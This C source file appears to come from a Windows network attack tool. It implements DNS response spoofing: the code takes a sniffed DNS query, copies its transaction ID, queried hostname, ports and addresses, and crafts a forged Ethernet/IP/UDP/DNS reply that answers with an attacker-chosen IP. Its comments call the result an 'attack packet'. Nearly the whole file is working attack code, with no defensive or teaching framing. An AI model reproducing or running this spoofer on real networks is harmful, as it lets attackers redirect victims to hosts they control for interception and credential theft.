

#define HAVE_REMOTE

#include <pcap.h>
#include <windows.h>
#include <stdio.h>

#include "APE.h"
#include "PacketCrafter.h"
#include "LinkedListSpoofedDNSHosts.h"
#include "DnsResponsePoisoning.h"
#include "NetDns.h"


/*
 *
 *
 */
int buildSpoofedDnsReplyPacket(unsigned char *pRawPacket, int pRawPacketLen, PHOSTNODE pNode, char *pOutputBuffer, int *pOutputBufferLen)
{
  int dnsSpoofingPacketsize = 0;
  int etherPacketSize = sizeof(ETHDR);
  int ipPacketSize = sizeof(IPHDR);
  int udpPacketSize = sizeof(UDPHDR);
  int dnsPacketSize = sizeof(DNS_BASIC) + sizeof(DNS_QUERY) + sizeof(DNS_ANSWER);
  unsigned short lDstPort = 0;
  unsigned short lSrcPort = 0;
  PETHDR ethrHdr = (PETHDR) pRawPacket;
  PIPHDR ipHdr = NULL;
  PUDPHDR updHdr = NULL;
  PUDPHDR updHdr2 = NULL;
  IPADDRESS saddr, daddr;
  PDNS_BASIC dnsBasicHdr = NULL;
  PDNS_BASIC dnsAnswerHdr = NULL;
  unsigned long ulTmp = 0;
  unsigned short transactionId = 0;
  int counter = 0;
  int dnsUrlCounter = 0;
  unsigned char dnsUrlA[512];
  unsigned char *dnsUrl = NULL;
  unsigned char binDestMac[BIN_MAC_LEN];
  unsigned char binSrcMac[BIN_MAC_LEN];

  // Initialize output buffer
  ZeroMemory(pOutputBuffer, *pOutputBufferLen);
  *pOutputBufferLen = 0;

  // Copy destination and source MAC addresses
  CopyMemory(binSrcMac, ethrHdr->ether_dhost, BIN_MAC_LEN);	
  CopyMemory(binDestMac, ethrHdr->ether_shost, BIN_MAC_LEN);

  // IP Header
  ipHdr = (PIPHDR) (pRawPacket + etherPacketSize);
  saddr = ipHdr->saddr;
  daddr = ipHdr->daddr;

  // Copy UDP src(client) and dest(dns server) port
  updHdr2 = (PUDPHDR) (pRawPacket + etherPacketSize + ipPacketSize);
  lSrcPort = ntohs(updHdr2->sport);	
  lDstPort = ntohs(updHdr2->dport);	


  // DNS basic header	
  dnsBasicHdr = (PDNS_BASIC) (pRawPacket + etherPacketSize + ipPacketSize + udpPacketSize);


  //copy the transaction id 
  transactionId = dnsBasicHdr->trans_id;
  dnsUrl = (unsigned char *) (pRawPacket + etherPacketSize + ipPacketSize+ udpPacketSize + sizeof(DNS_BASIC));


  // Copy requested hostname
  ZeroMemory(dnsUrlA, sizeof(dnsUrlA));
  for (dnsUrlCounter = 0; dnsUrl[dnsUrlCounter] != 0; dnsUrlCounter++)
    dnsUrlA[dnsUrlCounter] = dnsUrl[dnsUrlCounter];

  dnsUrlA[dnsUrlCounter] = 0;
  dnsUrlCounter++;

  // Obtain the total attack packet size
  dnsSpoofingPacketsize = dnsUrlCounter + etherPacketSize + ipPacketSize+ udpPacketSize + dnsPacketSize;	

  // Generate ethernet header for lDNSPacket
  GenerateEtherPacket((unsigned char *) pOutputBuffer,  (unsigned char *) binDestMac,  (unsigned char *) binSrcMac);


  // Generate IP header for lDNSPacket
  ipHdr = (PIPHDR) (pOutputBuffer + etherPacketSize);
  GenerateIpPacket((unsigned char *) ipHdr, IPPROTO_UDP, saddr, daddr, dnsSpoofingPacketsize);

  // Generate UDP header for lDNSPacket
  updHdr = (PUDPHDR) ((unsigned char *) ipHdr + ipPacketSize);
  GenerateUdpPacket((unsigned char *) updHdr, dnsSpoofingPacketsize, lSrcPort, lDstPort);

  // Generate DNS header for lDNSPacket
  dnsAnswerHdr = (PDNS_BASIC) ((unsigned char *) updHdr + udpPacketSize);

  // WOW!!!
  GenerateDnsPacket((unsigned char *) dnsAnswerHdr, dnsUrlCounter, dnsUrlA, transactionId,  (char *) pNode->sData.SpoofedIP);
  *pOutputBufferLen = dnsSpoofingPacketsize;

  return 1;
}




/*
 *
 *
 */
void GenerateEtherPacket(unsigned char * packet, unsigned char * dest, unsigned char * source)
{
  PETHDR ethrHdr = (PETHDR) packet;
  int counter;

  // Handle the MAC of source and destination of packet
  for (counter = 0; counter < BIN_MAC_LEN; counter++)	
    ethrHdr->ether_dhost[counter] = source[counter];

  for (counter = 0; counter < BIN_MAC_LEN; counter++)	
    ethrHdr->ether_shost[counter] = dest[counter];

  ethrHdr->ether_type = htons(0x0800);  //type of ethernet header
}



/*
 *
 *
 */
void GenerateIpPacket(unsigned char *packet, unsigned char ipProtocol, IPADDRESS srcAddr, IPADDRESS dstAddr, unsigned short dnsPacketSize)
{
  PIPHDR ipHdr = (PIPHDR) packet;

  // Fill up fields in ip header 
  ipHdr->ver_ihl = 0x45;	//version of IP header = 4
  ipHdr->tos = 0x00;		//type of service
  dnsPacketSize = dnsPacketSize - sizeof(ETHDR);
  ipHdr->tlen = htons(dnsPacketSize); //length of packet
  ipHdr->identification = htons((unsigned short) GetCurrentProcessId()); //packet identification=process ID
  ipHdr->flags_fo = htons(0x0000);//fragment offset field and u16_flags
  ipHdr->ttl = 0x3a; 	//time to live  
  ipHdr->proto = ipProtocol; //protocol;
  ipHdr->saddr = srcAddr;	//source IP address = dns server
  ipHdr->daddr = dstAddr;	//destination IP address = client
  ipHdr->crc = (unsigned short) in_cksum((unsigned short *) ipHdr, sizeof(IPHDR));//check_sum
}



/*
 *
 *
 */
void GenerateDnsPacket(unsigned char * packet, unsigned short dnsHdrLength, unsigned char *dnsUrlA, unsigned short transactionId, char *spoofedIp)
{
  PDNS_BASIC dnsBasidHdr = (PDNS_BASIC) packet;
  PDNS_QUERY dnsQueryHdr = NULL;
  PDNS_ANSWER dnsAnswerHdr = NULL;
  char *dnsUrl = NULL;
  struct in_addr spoofedIpAddr;

  spoofedIpAddr.s_addr = inet_addr(spoofedIp);

  //setting up the basic structure of a DNS packet
  dnsBasidHdr->trans_id = transactionId;
  dnsBasidHdr->flags = htons(0x8180);
  dnsBasidHdr->ans = htons(0x0001);
  dnsBasidHdr->ques = htons(0x0001);
  dnsBasidHdr->add = htons(0x0000);
  dnsBasidHdr->auth = htons(0x0000);

  // Copy the URL over
  dnsUrl = (char *) (packet + sizeof(DNS_BASIC));

  ZeroMemory((char *) dnsUrl, dnsHdrLength);
  CopyMemory(dnsUrl, dnsUrlA, dnsHdrLength);


  // Setting up the query structure of a DNS packet
  dnsQueryHdr = (PDNS_QUERY) (packet + sizeof(DNS_BASIC) + dnsHdrLength) ;	
  dnsQueryHdr->q_class = htons(0x0001);
  dnsQueryHdr->q_type = htons(0x0001);

  // Setting up the answer structure of a DNS packet
  dnsAnswerHdr = (PDNS_ANSWER) (packet + sizeof(DNS_BASIC) + dnsHdrLength + sizeof(DNS_QUERY)) ;	
  dnsAnswerHdr->a_url = htons(0xc00c);   // URL in question
  dnsAnswerHdr->a_type = htons(0x0001);  // type of query
  dnsAnswerHdr->a_class = htons(0x0001); // class of query->class IN
  dnsAnswerHdr->a_ttl1 = htons(0x0000);
  dnsAnswerHdr->a_ttl2 = htons(0x003a);  // time to live (4bytes)=0000003a=58s
  dnsAnswerHdr->a_len = htons(0x0004);   // Length of resource data length=length of Type A reply =4 bytes IP address
  dnsAnswerHdr->a_ip = spoofedIpAddr;   //user-specified IP
}


/*
 *
 *
 */
void GenerateUdpPacket(unsigned char * packet, unsigned short udpPacketLength, unsigned short srcPort, unsigned short dstPort)
{
  PUDPHDR udpHdr = (PUDPHDR) packet;

  //fill up fields in UDP header
  udpHdr->sport = htons(srcPort);	// source port of attack_packet
  udpHdr->dport = htons(dstPort);	// destination port of attack_packet
  udpPacketLength = udpPacketLength - sizeof(IPHDR) - sizeof(ETHDR);
  udpHdr->ulen = htons(udpPacketLength);		// length
  udpHdr->sum = 0;
}


/*
 *
 *
 */
unsigned short in_cksum(unsigned short * addr, int length)
{
  register int sum = 0;
  unsigned short checkSum = 0;
  register unsigned short *w = addr;
  register int numLeft = length;

  // using a 32 bit accumulator (sum), u16_add sequential 16 bit words to it, and at the end, fold back all the
  // carry bits from the top 16 bits into the lower 16 bits.
  while (numLeft > 1)  
  {
    sum += *w++;
    numLeft -= 2;
  }

  //handle odd byte
  if (numLeft == 1) 
  {
    *(unsigned char *) (&checkSum) = *(unsigned char *) w;
    sum += checkSum;
  }

  // u16_add back carry outs from top 16 bits to low 16 bits 
  sum = (sum >> 16) + (sum & 0xffff);    // u16_add high 16 to low 16 
  sum += (sum >> 16);                     // u16_add carry 
  checkSum = ~sum;                        // truncate to 16 bits

  return checkSum;
}
